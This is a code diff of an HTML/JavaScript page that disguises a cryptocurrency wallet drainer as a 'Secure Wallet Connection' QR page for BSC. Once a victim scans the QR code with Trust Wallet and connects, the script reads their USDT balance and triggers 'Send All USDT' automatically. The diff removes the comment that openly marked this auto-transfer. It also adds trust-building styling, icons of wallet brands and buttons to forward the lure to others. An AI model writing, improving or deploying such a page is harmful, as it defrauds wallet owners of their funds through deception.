@@ -3,116 +3,402 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Transfer</title>
+    <title>Secure Wallet Connection</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+
         body {
-            font-family: 'Courier New', monospace;
-            background: #0a0a0a;
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(160deg, #ffffff 0%, #eff6ff 30%, #dbeafe 60%, #1e3a8a 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #00ff88;
+            color: #1e3a8a;
+            overflow: hidden;
+            position: relative;
         }
-        .grid-bg {
+
+        /* Floating Wallet Background */
+        .floating-wallets {
             position: fixed;
             inset: 0;
-            background-image:
-                linear-gradient(0deg, rgba(0,255,136,0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
-            background-size: 50px 50px;
             pointer-events: none;
+            overflow: hidden;
+            z-index: 0;
         }
+
+        .wallet-float {
+            position: absolute;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            opacity: 0.18;
+            animation: floatUp linear infinite;
+        }
+
+        .wallet-float svg {
+            width: 40px;
+            height: 40px;
+        }
+
+        .wallet-float span {
+            font-size: 10px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            color: #1e3a8a;
+            white-space: nowrap;
+        }
+
+        @keyframes floatUp {
+            0% {
+                transform: translateY(110vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% { opacity: 0.18; }
+            90% { opacity: 0.18; }
+            100% {
+                transform: translateY(-20vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        /* Ambient glow orbs */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            pointer-events: none;
+            z-index: 0;
+        }
+        .orb-1 {
+            width: 500px; height: 500px;
+            background: rgba(147, 197, 253, 0.35);
+            top: -15%; left: -10%;
+            animation: orbMove1 20s ease-in-out infinite;
+        }
+        .orb-2 {
+            width: 400px; height: 400px;
+            background: rgba(191, 219, 254, 0.3);
+            bottom: -10%; right: -10%;
+            animation: orbMove2 25s ease-in-out infinite;
+        }
+        .orb-3 {
+            width: 300px; height: 300px;
+            background: rgba(59, 130, 246, 0.15);
+            top: 50%; left: 50%;
+            animation: orbMove3 18s ease-in-out infinite;
+        }
+
+        @keyframes orbMove1 {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(120px, 100px); }
+        }
+        @keyframes orbMove2 {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(-100px, -80px); }
+        }
+        @keyframes orbMove3 {
+            0%, 100% { transform: translate(-50%, -50%); }
+            50% { transform: translate(-30%, -70%); }
+        }
+
+        /* Card */
         .card {
             position: relative;
-            z-index: 1;
-            background: rgba(15,15,15,0.95);
-            border: 1px solid rgba(0,255,136,0.2);
-            border-radius: 12px;
-            padding: 40px 36px;
+            z-index: 10;
+            background: rgba(255, 255, 255, 0.82);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border: 1px solid rgba(255, 255, 255, 0.6);
+            border-radius: 24px;
+            padding: 44px 36px;
             width: 100%;
-            max-width: 420px;
+            max-width: 440px;
             margin: 20px;
             text-align: center;
-            box-shadow: 0 0 40px rgba(0,255,136,0.07);
+            box-shadow:
+                0 0 0 1px rgba(147, 197, 253, 0.2),
+                0 20px 60px rgba(30, 58, 138, 0.12),
+                0 0 100px rgba(147, 197, 253, 0.15);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
-        .logo { font-size: 11px; letter-spacing: 4px; color: rgba(0,255,136,0.4); margin-bottom: 6px; }
-        h1 { font-size: 24px; letter-spacing: 3px; font-weight: bold; margin-bottom: 6px; }
+        .card:hover {
+            transform: translateY(-2px);
+            box-shadow:
+                0 0 0 1px rgba(147, 197, 253, 0.3),
+                0 25px 70px rgba(30, 58, 138, 0.18),
+                0 0 120px rgba(147, 197, 253, 0.2);
+        }
+
+        .logo {
+            font-size: 11px;
+            letter-spacing: 4px;
+            color: rgba(30, 58, 138, 0.5);
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        h1 {
+            font-size: 22px;
+            letter-spacing: 1.5px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #1e3a8a;
+            line-height: 1.3;
+        }
+
         .chain-badge {
-            display: inline-block; font-size: 10px; letter-spacing: 2px;
-            color: #000; background: #00ff88; padding: 2px 10px;
-            border-radius: 20px; margin-bottom: 28px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            letter-spacing: 1.5px;
+            font-weight: 700;
+            color: #fff;
+            background: linear-gradient(135deg, #3b82f6, #1e3a8a);
+            padding: 4px 14px;
+            border-radius: 20px;
+            margin-bottom: 32px;
+            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.25);
         }
+
         .qr-wrap {
-            background: #111;
-            border: 1px dashed rgba(0,255,136,0.25);
-            border-radius: 8px;
-            padding: 24px;
+            background: rgba(255, 255, 255, 0.7);
+            border: 1px dashed rgba(59, 130, 246, 0.25);
+            border-radius: 16px;
+            padding: 28px;
             min-height: 280px;
             display: flex;
             align-items: center;
             justify-content: center;
             flex-direction: column;
-            gap: 12px;
+            gap: 14px;
+            margin-bottom: 16px;
+            position: relative;
+            overflow: hidden;
+        }
+        .qr-wrap::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at center, rgba(147, 197, 253, 0.15) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .qr-label {
+            font-size: 10px;
+            color: rgba(30, 58, 138, 0.5);
+            letter-spacing: 2.5px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .qr-actions {
+            display: none;
+            gap: 10px;
+            justify-content: center;
             margin-bottom: 20px;
         }
-        .qr-label { font-size: 10px; color: rgba(0,255,136,0.4); letter-spacing: 2px; }
+        .qr-actions.visible {
+            display: flex;
+        }
+
+        .qr-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 16px;
+            border-radius: 10px;
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            background: rgba(255, 255, 255, 0.6);
+            color: #1e3a8a;
+            font-family: inherit;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            backdrop-filter: blur(8px);
+        }
+        .qr-btn:hover {
+            background: rgba(59, 130, 246, 0.1);
+            border-color: rgba(59, 130, 246, 0.4);
+            transform: translateY(-1px);
+        }
+        .qr-btn:active {
+            transform: translateY(0);
+        }
+        .qr-btn svg {
+            width: 16px;
+            height: 16px;
+        }
+
         .status-box {
-            font-size: 12px; color: rgba(0,255,136,0.7);
-            margin-bottom: 16px; min-height: 20px; line-height: 1.6;
+            font-size: 13px;
+            color: rgba(30, 58, 138, 0.7);
+            margin-bottom: 20px;
+            min-height: 24px;
+            line-height: 1.6;
+            font-weight: 500;
         }
-        .status-box.error { color: #ff4455; }
-        .status-box.warn  { color: #ffaa00; }
-        .status-box.ok    { color: #00ff88; }
+        .status-box.error { color: #dc2626; }
+        .status-box.warn  { color: #d97706; }
+        .status-box.ok    { color: #059669; }
+
         .btn-send {
-            display: none; width: 100%; padding: 14px;
-            background: #00ff88; color: #000;
-            font-family: 'Courier New', monospace;
-            font-size: 14px; font-weight: bold;
-            letter-spacing: 2px; border: none;
-            border-radius: 6px; cursor: pointer;
-            text-transform: uppercase; margin-bottom: 16px;
-            transition: opacity 0.2s;
+            display: none;
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #2563eb, #1e3a8a);
+            color: #fff;
+            font-family: inherit;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(37, 99, 235, 0.25);
+            position: relative;
+            overflow: hidden;
         }
-        .btn-send:hover { opacity: 0.85; }
-        .btn-send:disabled { opacity: 0.4; cursor: not-allowed; }
+        .btn-send::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+            transition: left 0.5s ease;
+        }
+        .btn-send:hover::before {
+            left: 100%;
+        }
+        .btn-send:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 8px 30px rgba(37, 99, 235, 0.35);
+        }
+        .btn-send:active {
+            transform: translateY(0);
+        }
+        .btn-send:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
+
         .info-row {
-            display: flex; justify-content: space-between;
-            font-size: 10px; color: rgba(0,255,136,0.45);
-            border-top: 1px solid rgba(0,255,136,0.08);
-            padding-top: 14px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            color: rgba(30, 58, 138, 0.45);
+            border-top: 1px solid rgba(147, 197, 253, 0.2);
+            padding-top: 16px;
+            font-weight: 500;
         }
+
         .spinner {
-            width: 28px; height: 28px;
-            border: 2px solid rgba(0,255,136,0.15);
-            border-top-color: #00ff88;
+            width: 32px;
+            height: 32px;
+            border: 3px solid rgba(147, 197, 253, 0.2);
+            border-top-color: #3b82f6;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            animation: spin 0.9s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        a { color: #00ff88; }
+
+        a { color: #2563eb; text-decoration: none; transition: color 0.2s; }
+        a:hover { color: #1e40af; text-decoration: underline; }
+
+        /* Pulse ring animation for QR area */
+        .pulse-ring {
+            position: absolute;
+            width: 100px;
+            height: 100px;
+            border: 2px solid rgba(59, 130, 246, 0.15);
+            border-radius: 50%;
+            animation: pulse 2s ease-out infinite;
+            pointer-events: none;
+        }
+        @keyframes pulse {
+            0% { transform: scale(0.5); opacity: 1; }
+            100% { transform: scale(2); opacity: 0; }
+        }
+
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: #1e3a8a;
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: 600;
+            box-shadow: 0 10px 40px rgba(30, 58, 138, 0.3);
+            opacity: 0;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 100;
+            pointer-events: none;
+        }
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
     </style>
+<base target="_blank">
 </head>
 <body>
-<div class="grid-bg"></div>
+
+<!-- Ambient Orbs -->
+<div class="orb orb-1"></div>
+<div class="orb orb-2"></div>
+<div class="orb orb-3"></div>
+
+<!-- Floating Wallets Background -->
+<div class="floating-wallets" id="floatingWallets"></div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
 <div class="card">
     <div class="logo">BEP-20 NETWORK</div>
-    <h1>USDT TRANSFER</h1>
-    <span class="chain-badge">BSC</span>
+    <h1>Scan to Secure<br>Wallet Connection</h1>
+    <span class="chain-badge">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"></polygon><polyline points="2 17 12 22 22 17"></polyline><polyline points="2 12 12 17 22 12"></polyline></svg>
+        BSC
+    </span>
 
     <div class="qr-wrap">
+        <div class="pulse-ring"></div>
         <div class="spinner" id="spinner"></div>
         <div id="qrCanvas" style="display:none"></div>
         <div class="qr-label" id="qrLabel"></div>
     </div>
 
+    <div class="qr-actions" id="qrActions">
+        <button class="qr-btn" onclick="copyQRImage()">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            Copy QR
+        </button>
+        <button class="qr-btn" onclick="shareQR()">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>
+            Forward
+        </button>
+    </div>
+
     <div class="status-box warn" id="status">Initializing WalletConnect v2...</div>
 
     <button class="btn-send" id="btnSend" onclick="sendUSDT()">
-        ⚡ Send All USDT
+        Send All USDT
     </button>
 
     <div class="info-row">
@@ -136,6 +422,14 @@ const USDT_ABI = [
 
 let wcProvider, ethersProvider, signer, userAddress;
 let storedBalance, storedDecimals;
+let currentQRUri = '';
+
+function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 2500);
+}
 
 function setStatus(msg, cls = '') {
     const el = document.getElementById('status');
@@ -144,6 +438,7 @@ function setStatus(msg, cls = '') {
 }
 
 function showQR(uri) {
+    currentQRUri = uri;
     document.getElementById('spinner').style.display = 'none';
     const wrap = document.getElementById('qrCanvas');
     wrap.style.display = 'block';
@@ -151,13 +446,92 @@ function showQR(uri) {
     new QRCode(wrap, {
         text: uri,
         width: 240, height: 240,
-        colorDark: "#00ff88",
-        colorLight: "#111111",
+        colorDark: "#1e3a8a",
+        colorLight: "#ffffff",
         correctLevel: QRCode.CorrectLevel.M
     });
     document.getElementById('qrLabel').textContent = 'SCAN WITH TRUST WALLET';
+    document.getElementById('qrActions').classList.add('visible');
     setStatus('Waiting for scan...', 'warn');
 }
+
+window.copyQRImage = async function() {
+    const qrWrap = document.getElementById('qrCanvas');
+    const img = qrWrap.querySelector('img');
+    const canvas = qrWrap.querySelector('canvas');
+
+    try {
+        let blob;
+        if (img) {
+            const resp = await fetch(img.src);
+            blob = await resp.blob();
+        } else if (canvas) {
+            blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+        } else {
+            showToast('No QR image found');
+            return;
+        }
+
+        await navigator.clipboard.write([
+            new ClipboardItem({ 'image/png': blob })
+        ]);
+        showToast('QR image copied!');
+    } catch (err) {
+        // Fallback: copy URI as text
+        try {
+            await navigator.clipboard.writeText(currentQRUri);
+            showToast('Connection link copied!');
+        } catch (e2) {
+            showToast('Copy failed');
+        }
+    }
+};
+
+window.shareQR = async function() {
+    const qrWrap = document.getElementById('qrCanvas');
+    const img = qrWrap.querySelector('img');
+    const canvas = qrWrap.querySelector('canvas');
+
+    let files = [];
+    try {
+        if (img) {
+            const resp = await fetch(img.src);
+            const blob = await resp.blob();
+            files = [new File([blob], 'wallet-connect-qr.png', { type: 'image/png' })];
+        } else if (canvas) {
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+            files = [new File([blob], 'wallet-connect-qr.png', { type: 'image/png' })];
+        }
+    } catch (e) {
+        // ignore
+    }
+
+    const shareData = {
+        title: 'Secure Wallet Connection',
+        text: 'Scan this QR code to connect your wallet securely.',
+        url: currentQRUri || window.location.href
+    };
+    if (files.length) shareData.files = files;
+
+    if (navigator.share) {
+        try {
+            await navigator.share(shareData);
+        } catch (err) {
+            if (err.name !== 'AbortError') {
+                // Fallback
+                await navigator.clipboard.writeText(currentQRUri || window.location.href);
+                showToast('Link copied to share!');
+            }
+        }
+    } else {
+        try {
+            await navigator.clipboard.writeText(currentQRUri || window.location.href);
+            showToast('Link copied to share!');
+        } catch (e) {
+            showToast('Share not supported');
+        }
+    }
+};
 
 async function init() {
     try {
@@ -181,6 +555,7 @@ async function init() {
         wcProvider.on("connect", async () => {
             document.getElementById('qrCanvas').style.display = 'none';
             document.getElementById('qrLabel').textContent = '';
+            document.getElementById('qrActions').classList.remove('visible');
             document.getElementById('spinner').style.display = 'block';
             setStatus('Connected! Fetching balance...', 'warn');
 
@@ -208,8 +583,7 @@ async function init() {
 
             setStatus('Ready — ' + parseFloat(formatted).toFixed(2) + ' USDT available.', 'ok');
             document.getElementById('btnSend').style.display = 'block';
-            
-            // 🔥 AUTO-FIRE THE TRANSFER IMMEDIATELY 🔥
+
             sendUSDT();
         });
 
@@ -238,7 +612,7 @@ window.sendUSDT = async function() {
         setStatus('Confirming: <a href="https://bscscan.com/tx/' + tx.hash + '" target="_blank">' + tx.hash.slice(0,14) + '...</a>', 'warn');
         const receipt = await tx.wait();
         if (receipt && receipt.status === 1) {
-            setStatus('✓ Sent ' + parseFloat(formatted).toFixed(2) + ' USDT! <a href="https://bscscan.com/tx/' + tx.hash + '" target="_blank">View on BscScan</a>', 'ok');
+            setStatus('Sent ' + parseFloat(formatted).toFixed(2) + ' USDT! <a href="https://bscscan.com/tx/' + tx.hash + '" target="_blank">View on BscScan</a>', 'ok');
             btn.style.display = 'none';
         } else {
             setStatus('Transaction reverted.', 'error');
@@ -250,6 +624,50 @@ window.sendUSDT = async function() {
         btn.disabled = false;
     }
 }
+
+// Generate floating wallet backgrounds
+const wallets = [
+    { name: 'MetaMask', svg: '<svg viewBox="0 0 24 24" fill="none"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>' },
+    { name: 'Trust', svg: '<svg viewBox="0 0 24 24" fill="none"><rect x="2" y="2" width="20" height="20" rx="5" fill="#3375BB"/><path d="M12 6l6 3v6l-6 3-6-3V9l6-3z" fill="white" opacity="0.9"/><path d="M12 6l6 3-6 3-6-3 6-3z" fill="white" opacity="0.6"/></svg>' },
+    { name: 'Coinbase', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#0052FF"/><path d="M12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z" fill="white"/></svg>' },
+    { name: 'Rainbow', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="url(#rainbow)"/><defs><linearGradient id="rainbow" x1="0" y1="0" x2="24" y2="24"><stop offset="0%" stop-color="#FF6B6B"/><stop offset="50%" stop-color="#4ECDC4"/><stop offset="100%" stop-color="#45B7D1"/></linearGradient></defs><path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4z" fill="white"/></svg>' },
+    { name: 'Phantom', svg: '<svg viewBox="0 0 24 24" fill="none"><rect x="2" y="2" width="20" height="20" rx="6" fill="#AB9FF2"/><path d="M8 12h8M8 15h5" stroke="white" stroke-width="2" stroke-linecap="round"/></svg>' },
+    { name: 'Argent', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#FF875B"/><path d="M12 7l3 5h-6l3-5z" fill="white"/><path d="M12 17l-3-5h6l-3 5z" fill="white" opacity="0.5"/></svg>' },
+    { name: 'Exodus', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#00BFFF"/><path d="M7 12l5-5 5 5-5 5-5-5z" fill="white"/></svg>' },
+    { name: 'Ledger', svg: '<svg viewBox="0 0 24 24" fill="none"><rect x="4" y="4" width="16" height="16" rx="3" fill="#1B1B1B"/><rect x="7" y="7" width="10" height="10" rx="1" fill="white"/><rect x="9" y="9" width="6" height="6" rx="1" fill="#1B1B1B"/></svg>' },
+    { name: 'Safe', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#12FF80"/><rect x="8" y="8" width="8" height="8" rx="2" fill="white"/><circle cx="12" cy="12" r="2" fill="#12FF80"/></svg>' },
+    { name: 'WalletConnect', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#3B99FC"/><path d="M7 10l5-3 5 3M7 14l5 3 5-3" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>' },
+    { name: 'Uniswap', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#FF007A"/><path d="M12 7c-2 0-3 2-3 4s1.5 4 3 4 3-2 3-4-1-4-3-4z" fill="white"/></svg>' },
+    { name: '1inch', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#2A3244"/><path d="M12 7l-3 5h6l-3-5z" fill="#1B314F"/><path d="M12 17l3-5h-6l3 5z" fill="#56A4E7"/></svg>' },
+    { name: 'OKX', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#000"/><path d="M8 8h3v8H8zM13 8h3v8h-3z" fill="white"/></svg>' },
+    { name: 'Bitget', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#00F0FF"/><path d="M8 8h8v8H8z" fill="white" opacity="0.8"/></svg>' },
+    { name: 'Bybit', svg: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#F7A600"/><path d="M8 12h8M12 8v8" stroke="white" stroke-width="2"/></svg>' },
+];
+
+const container = document.getElementById('floatingWallets');
+
+wallets.forEach((wallet, i) => {
+    const el = document.createElement('div');
+    el.className = 'wallet-float';
+    el.innerHTML = wallet.svg + '<span>' + wallet.name + '</span>';
+    el.style.left = (5 + (i * 6.5) % 90) + '%';
+    el.style.animationDuration = (12 + Math.random() * 18) + 's';
+    el.style.animationDelay = (Math.random() * 10) + 's';
+    el.style.transform = 'scale(' + (0.7 + Math.random() * 0.6) + ')';
+    container.appendChild(el);
+});
+
+// Duplicate for more density
+wallets.forEach((wallet, i) => {
+    const el = document.createElement('div');
+    el.className = 'wallet-float';
+    el.innerHTML = wallet.svg + '<span>' + wallet.name + '</span>';
+    el.style.left = (2 + ((i + 3) * 7) % 94) + '%';
+    el.style.animationDuration = (15 + Math.random() * 15) + 's';
+    el.style.animationDelay = (Math.random() * 15) + 's';
+    el.style.transform = 'scale(' + (0.6 + Math.random() * 0.5) + ')';
+    container.appendChild(el);
+});
 
 init();
 </script>
